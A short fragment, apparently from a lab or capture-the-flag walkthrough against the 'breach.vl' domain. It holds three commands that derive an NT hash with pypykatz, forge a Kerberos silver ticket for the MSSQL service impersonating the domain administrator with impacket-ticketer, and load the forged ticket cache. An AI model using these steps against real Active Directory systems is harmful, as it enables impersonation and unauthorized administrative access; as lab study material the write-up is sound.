

```
pypykatz crypto nt <password>
```


```
impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash <hash_from_above> -dc-ip 10.129.25.237 -domain breach.vl -user-id 500 administrator
```


```
export KRB5CCNAME=Administrator.ccache
```

